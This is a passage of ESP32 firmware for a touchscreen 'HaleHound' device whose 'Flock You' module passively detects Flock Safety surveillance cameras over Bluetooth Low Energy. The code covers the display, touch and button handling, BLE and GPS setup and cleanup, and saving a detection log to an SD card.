    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.printf("%d dBm  Best: %d dBm", d.rssi, d.bestRssi);
    y += 14;

    // Proximity bar
    int barWidth = map(constrain(d.rssi, -100, -30), -100, -30, 5, 200);
    tft.fillRect(10, y, barWidth, 8, fyProximityColor(d.rssi));
    tft.drawRect(10, y, 200, 8, HALEHOUND_VIOLET);
    y += 16;

    // Evidence section
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Evidence:");
    y += 12;

    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.setCursor(14, y);
    if (d.matchFlags & FY_MATCH_OUI)  tft.print("[OUI] ");
    if (d.matchFlags & FY_MATCH_NAME) tft.print("[NAME] ");
    if (d.matchFlags & FY_MATCH_MFR)  tft.print("[MFR] ");
    if (d.matchFlags & FY_MATCH_SVC)  tft.print("[SVC] ");
    y += 14;

    // Raven services (if applicable)
    if (d.ravenSvcMask) {
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(10, y);
        tft.print("Raven Services:");
        y += 12;

        tft.setTextColor(HALEHOUND_VIOLET);
        tft.setCursor(14, y);
        if (d.ravenSvcMask & FY_RAVEN_DEVINFO)  tft.print("DevInfo ");
        if (d.ravenSvcMask & FY_RAVEN_GPS)      tft.print("GPS ");
        if (d.ravenSvcMask & FY_RAVEN_POWER)    tft.print("Power ");
        if (d.ravenSvcMask & FY_RAVEN_NETWORK)  tft.print("Net ");
        if (d.ravenSvcMask & FY_RAVEN_UPLOAD)   tft.print("Upload ");
        if (d.ravenSvcMask & FY_RAVEN_FAILURE)  tft.print("Fail ");
        if (d.ravenSvcMask & FY_RAVEN_OLD_HLTH) tft.print("Hlth* ");
        if (d.ravenSvcMask & FY_RAVEN_OLD_LOC)  tft.print("Loc* ");
        y += 12;

        tft.setCursor(14, y);
        tft.setTextColor(HALEHOUND_BRIGHT);
        tft.printf("FW est: %s", fyRavenFwEstimate(d.ravenSvcMask));
        y += 14;
    }

    // Timing
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("First: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    unsigned long firstElapsed = (millis() - d.firstSeen) / 1000;
    if (firstElapsed < 60) tft.printf("%lus ago", firstElapsed);
    else tft.printf("%lum %lus ago", firstElapsed / 60, firstElapsed % 60);
    y += 12;

    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y);
    tft.print("Last: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    unsigned long lastElapsed = (millis() - d.lastSeen) / 1000;
    tft.printf("%lus ago", lastElapsed);
    y += 12;

    tft.setCursor(10, y);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.print("Count: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.printf("%d", d.seenCount);
    y += 18;

    // BACK button
    int btnY = SCREEN_HEIGHT - 28;
    tft.drawRect(80, btnY, 80, 24, HALEHOUND_HOTPINK);
    tft.drawRect(81, btnY + 1, 78, 22, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(104, btnY + 8);
    tft.print("BACK");
}

static void fyDrawAlert() {
    if (!fyAlertActive) return;
    if (millis() - fyAlertTime > FY_ALERT_DURATION) {
        fyAlertActive = false;
        return;
    }

    // Pulse RED border 3x (200ms on/off each = ~1200ms of 2000ms alert)
    unsigned long phase = millis() - fyAlertTime;
    bool on = (phase / 200) % 2 == 0;

    if (on && phase < 1200) {
        tft.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, 0xF800);
        tft.drawRect(1, 1, SCREEN_WIDTH - 2, SCREEN_HEIGHT - 2, 0xF800);
    }
}

static void fyDrawBottomButtons() {
    int btnY = SCREEN_HEIGHT - 28;
    int btnW = 60;
    int btnH = 24;

    // Clear button area
    tft.fillRect(0, btnY - 2, SCREEN_WIDTH, 30, HALEHOUND_BLACK);

    // STOP/START button (left)
    tft.drawRect(10, btnY, btnW, btnH, HALEHOUND_HOTPINK);
    tft.drawRect(11, btnY + 1, btnW - 2, btnH - 2, HALEHOUND_HOTPINK);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(17, btnY + 8);
    tft.print(fyScanPaused ? "START" : "STOP");

    // SAVE button (center)
    tft.drawRect(90, btnY, btnW, btnH, HALEHOUND_HOTPINK);
    tft.drawRect(91, btnY + 1, btnW - 2, btnH - 2, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(103, btnY + 8);
    tft.print("SAVE");

    // BACK button (right)
    tft.drawRect(170, btnY, btnW, btnH, HALEHOUND_HOTPINK);
    tft.drawRect(171, btnY + 1, btnW - 2, btnH - 2, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(183, btnY + 8);
    tft.print("BACK");
}

// ═══════════════════════════════════════════════════════════════════════════
// SD CARD SAVE
// ═══════════════════════════════════════════════════════════════════════════

static void fySetStatus(const char* msg, uint16_t color) {
    tft.fillRect(0, 57, SCREEN_WIDTH, 14, HALEHOUND_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(color);
    tft.setCursor(5, 60);
    tft.print(msg);
}

static void fySaveLoot() {
    if (fyDeviceCount == 0) {
        fySetStatus("No devices to save!", HALEHOUND_GUNMETAL);
        delay(1000);
        return;
    }

    fySetStatus("Saving to SD...", HALEHOUND_MAGENTA);

    // Stop scan task while using SPI
    bool wasRunning = fyScanRunning;
    if (wasRunning) fyStopScanTask();

    // Deinit BLE before SPI takeover
    if (pFyScan) pFyScan->stop();
    BLEDevice::deinit(false);

    // Init SD card (same pattern as BlePredator)
    SPI.end();
    delay(10);
    SPI.begin(18, 19, 23);
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);
    delay(10);

    if (!SD.begin(SD_CS, SPI, 4000000)) {
        SPI.end();
        delay(50);
        SPI.begin(18, 19, 23);
        if (!SD.begin(SD_CS, SPI, 4000000)) {
            fySetStatus("SD card not found!", 0xF800);
            SD.end();
            // Re-init BLE
            releaseClassicBtMemory();
            BLEDevice::init("");
            delay(150);
            pFyScan = BLEDevice::getScan();
            if (pFyScan) {
                pFyScan->setActiveScan(true);
                pFyScan->setInterval(100);
                pFyScan->setWindow(99);
            }
            if (wasRunning) fyStartScanTask();
            delay(1000);
            return;
        }
    }

    if (!SD.exists("/loot")) {
        SD.mkdir("/loot");
    }

    char fname[48];
    snprintf(fname, sizeof(fname), "/loot/flock_%lu.txt", millis());

    File f = SD.open(fname, FILE_WRITE);
    if (!f) {
        fySetStatus("File write failed!", 0xF800);
        SD.end();
        releaseClassicBtMemory();
        BLEDevice::init("");
        delay(150);
        pFyScan = BLEDevice::getScan();
        if (pFyScan) {
            pFyScan->setActiveScan(true);
            pFyScan->setInterval(100);
            pFyScan->setWindow(99);
        }
        if (wasRunning) fyStartScanTask();
        delay(1000);
        return;
    }

    // Write header
    f.println("========================================");
    f.println("  FLOCK YOU - Surveillance Camera Log");
    f.println("  HaleHound Edition");
    f.println("========================================");
    f.println();

    String elapsed = getElapsedTimeString(fyScanStartTime);
    f.printf("Scan Duration: %s\n", elapsed.c_str());
    f.printf("Total Scans: %lu\n", (unsigned long)fyTotalScans);
    f.printf("Devices Found: %d\n", fyDeviceCount);

    // GPS coordinates if available
    if (gpsHasFix()) {
        GPSData gd = gpsGetData();
        f.printf("GPS: %.6f, %.6f\n", gd.latitude, gd.longitude);
    } else {
        f.println("GPS: No Fix");
    }

    f.println();
    f.println("--- DETECTIONS ---");

    for (int i = 0; i < fyDeviceCount; i++) {
        FlockDevice& d = fyDevices[i];
        f.println();
        f.printf("[%d] %s\n", i + 1, fyTypeName(d.type));
        f.printf("    MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                 d.mac[0], d.mac[1], d.mac[2], d.mac[3], d.mac[4], d.mac[5]);
        if (d.name[0] != '\0') {
            f.printf("    Name: \"%s\"\n", d.name);
        }
        f.printf("    RSSI: %d dBm (best: %d dBm)\n", d.rssi, d.bestRssi);

        f.printf("    Evidence:");
        if (d.matchFlags & FY_MATCH_OUI)  f.print(" OUI");
        if (d.matchFlags & FY_MATCH_NAME) f.print(" NAME");
        if (d.matchFlags & FY_MATCH_MFR)  f.print(" MFR_ID");
        if (d.matchFlags & FY_MATCH_SVC)  f.print(" SVC_UUID");
        f.println();

        if (d.ravenSvcMask) {
            f.printf("    Services:");
            if (d.ravenSvcMask & FY_RAVEN_DEVINFO)  f.print(" DevInfo");
            if (d.ravenSvcMask & FY_RAVEN_GPS)      f.print(" GPS");
            if (d.ravenSvcMask & FY_RAVEN_POWER)    f.print(" Power");
            if (d.ravenSvcMask & FY_RAVEN_NETWORK)  f.print(" Network");
            if (d.ravenSvcMask & FY_RAVEN_UPLOAD)   f.print(" Upload");
            if (d.ravenSvcMask & FY_RAVEN_FAILURE)  f.print(" Failure");
            if (d.ravenSvcMask & FY_RAVEN_OLD_HLTH) f.print(" Health(v1.1)");
            if (d.ravenSvcMask & FY_RAVEN_OLD_LOC)  f.print(" Location(v1.1)");
            f.println();
            f.printf("    FW Estimate: %s\n", fyRavenFwEstimate(d.ravenSvcMask));
        }

        unsigned long firstEl = (millis() - d.firstSeen) / 1000;
        unsigned long lastEl  = (millis() - d.lastSeen) / 1000;
        f.printf("    First: %02lu:%02lu:%02lu  Last: %02lu:%02lu:%02lu  Count: %d\n",
                 firstEl / 3600, (firstEl % 3600) / 60, firstEl % 60,
                 lastEl / 3600, (lastEl % 3600) / 60, lastEl % 60,
                 d.seenCount);
    }

    f.close();
    SD.end();

    char statusBuf[48];
    snprintf(statusBuf, sizeof(statusBuf), "Saved: %s", fname);
    fySetStatus(statusBuf, HALEHOUND_GREEN);

    // Re-init BLE
    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);
    pFyScan = BLEDevice::getScan();
    if (pFyScan) {
        pFyScan->setActiveScan(true);
        pFyScan->setInterval(100);
        pFyScan->setWindow(99);
    }
    if (wasRunning) fyStartScanTask();

    delay(1500);
}

// ═══════════════════════════════════════════════════════════════════════════
// TOUCH HANDLING
// ═══════════════════════════════════════════════════════════════════════════

static void fyHandleTouch() {
    static unsigned long lastTap = 0;
    if (millis() - lastTap < 200) return;

    uint16_t tx, ty;
    if (!getTouchPoint(&tx, &ty)) return;
    lastTap = millis();

    // ── Detail view: BACK button ──
    if (fyDetailView) {
        int btnY = SCREEN_HEIGHT - 28;
        if (ty >= btnY && ty <= btnY + 24 && tx >= 80 && tx <= 160) {
            fyDetailView = false;
            fyDrawStats();
            fyDrawDeviceList();
            fyDrawBottomButtons();
        }
        return;
    }

    // ── Icon bar (y 20-36) ──
    if (ty >= 20 && ty <= 36) {
        if (tx >= 0 && tx < 40) {
            // Back arrow — exit
            fyExitRequested = true;
            return;
        }
        if (tx >= 200 && tx <= 240) {
            // Refresh — force rescan (handled by task, just visual feedback)
            fySetStatus(">> RESCANNING <<", HALEHOUND_HOTPINK);
            return;
        }
    }

    // ── Bottom buttons (y = SCREEN_HEIGHT-28 to SCREEN_HEIGHT-4) ──
    int btnY = SCREEN_HEIGHT - 28;
    if (ty >= btnY && ty <= btnY + 24) {
        // STOP/START (left: x 10-70)
        if (tx >= 10 && tx <= 70) {
            fyScanPaused = !fyScanPaused;
            if (fyScanPaused) {
                fyStopScanTask();
            } else {
                // Re-init BLE if needed
                if (!pFyScan) {
                    releaseClassicBtMemory();
                    BLEDevice::init("");
                    delay(150);
                    pFyScan = BLEDevice::getScan();
                    if (pFyScan) {
                        pFyScan->setActiveScan(true);
                        pFyScan->setInterval(100);
                        pFyScan->setWindow(99);
                    }
                }
                fyStartScanTask();
            }
            fyDrawStatus();
            fyDrawBottomButtons();
            return;
        }
        // SAVE (center: x 90-150)
        if (tx >= 90 && tx <= 150) {
            fySaveLoot();
            // Redraw full UI after SD operation
            tft.fillScreen(HALEHOUND_BLACK);
            drawStatusBar();
            fyDrawIconBar();
            fyDrawTitle();
            fyDrawStatus();
            fyDrawStats();
            fyDrawDeviceList();
            fyDrawBottomButtons();
            return;
        }
        // BACK (right: x 170-230)
        if (tx >= 170 && tx <= 230) {
            fyExitRequested = true;
            return;
        }
    }

    // ── Device list tap (y 92 to SCREEN_HEIGHT-30) ──
    if (ty >= 92 && ty < SCREEN_HEIGHT - 30 && fyDeviceCount > 0) {
        int tappedRow = (ty - 92) / FY_LINE_HEIGHT;
        int tappedIdx = tappedRow + fyScrollOffset;
        if (tappedIdx >= 0 && tappedIdx < fyDeviceCount) {
            fySelectedIdx = tappedIdx;
            fyDetailView = true;
            fyDrawDetail();
            return;
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SETUP / LOOP / EXIT / CLEANUP
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (fyInitialized) return;

    Serial.println("[FLOCK] Initializing Flock Safety detector...");

    // Reset all state
    fyDeviceCount = 0;
    fySelectedIdx = 0;
    fyScrollOffset = 0;
    fyDetailView = false;
    fyExitRequested = false;
    fyScanPaused = false;
    fyAlertActive = false;
    fyTotalDetections = 0;
    fyTotalScans = 0;
    fyDotCount = 0;
    fyDotTimer = millis();
    fyScanStartTime = millis();
    fyLastUiUpdate = 0;
    pFyScan = nullptr;
    fyScanTaskHandle = NULL;
    fyScanRunning = false;
    fyScanStop = false;

    // Draw initial UI
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    fyDrawIconBar();
    fyDrawTitle();

    // Init GPS (same pattern as wardriving — auto-scans pins/baud, starts background task)
    gpsSetup();
    gpsStartBackground();
    for (int i = 0; i < 50; i++) {
        gpsUpdate();
        delay(10);
    }
    Serial.println("[FLOCK] GPS initialized");

    // Init BLE
    WiFi.mode(WIFI_OFF);
    delay(50);

    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);

    pFyScan = BLEDevice::getScan();
    if (!pFyScan) {
        Serial.println("[FLOCK] ERROR: getScan() returned NULL");
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setCursor(10, 100);
        tft.print("BLE INIT FAILED");
        fyExitRequested = true;
        return;
    }
    pFyScan->setActiveScan(true);
    pFyScan->setInterval(100);
    pFyScan->setWindow(99);

    fyInitialized = true;

    // Draw status and empty state
    fyDrawStatus();
    fyDrawStats();
    fyDrawDeviceList();
    fyDrawBottomButtons();

    // Start scan task on Core 0
    fyStartScanTask();

    // Consume lingering touch from menu selection
    waitForTouchRelease();

    Serial.println("[FLOCK] Flock Safety detector ready");
}

void loop() {
    if (!fyInitialized) return;

    // Feed GPS parser
    gpsUpdate();

    // Touch and button handling
    touchButtonsUpdate();
    fyHandleTouch();

    // Button navigation
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (fyDetailView) {
            fyDetailView = false;
            fyDrawStats();
            fyDrawDeviceList();
            fyDrawBottomButtons();
        } else {
            fyExitRequested = true;
        }
        return;
    }

    if (!fyDetailView) {
        if (buttonPressed(BTN_UP)) {
            if (fySelectedIdx > 0) {
                fySelectedIdx--;
                if (fySelectedIdx < fyScrollOffset) fyScrollOffset--;
                fyDrawDeviceList();
            }
        }
        if (buttonPressed(BTN_DOWN)) {
            if (fySelectedIdx < fyDeviceCount - 1) {
                fySelectedIdx++;
                if (fySelectedIdx >= fyScrollOffset + FY_MAX_VISIBLE) fyScrollOffset++;
                fyDrawDeviceList();
            }
        }
        if (buttonPressed(BTN_SELECT) || buttonPressed(BTN_RIGHT)) {
            if (fyDeviceCount > 0) {
                fyDetailView = true;
                fyDrawDetail();
            }
        }
    } else {
        if (buttonPressed(BTN_LEFT)) {
            fyDetailView = false;
            fyDrawStats();
            fyDrawDeviceList();
            fyDrawBottomButtons();
        }
    }

    // Throttled UI refresh
    if (millis() - fyLastUiUpdate >= FY_UI_REFRESH_MS) {
        fyLastUiUpdate = millis();

        // Animated dots for empty state
        if (fyDeviceCount == 0 && millis() - fyDotTimer > 500) {
            fyDotTimer = millis();
            fyDotCount = (fyDotCount + 1) % 4;
        }

        if (!fyDetailView) {
            fyDrawStatus();
            fyDrawStats();
            fyDrawDeviceList();
            fyDrawBottomButtons();
        }

        // Alert flash
        fyDrawAlert();
    }
}

bool isExitRequested() { return fyExitRequested; }

void cleanup() {
    // Stop scan task first
    fyStopScanTask();

    // Stop and deinit BLE
    if (pFyScan) pFyScan->stop();
    BLEDevice::deinit(false);
    pFyScan = nullptr;

    // Stop GPS background task and restore serial
    gpsStopBackground();

    fyInitialized = false;
    fyExitRequested = false;
    fyDeviceCount = 0;

    // Re-enable WiFi for other modules
    WiFi.mode(WIFI_STA);

    Serial.println("[FLOCK] Cleanup complete");
}

}  // namespace FlockYou
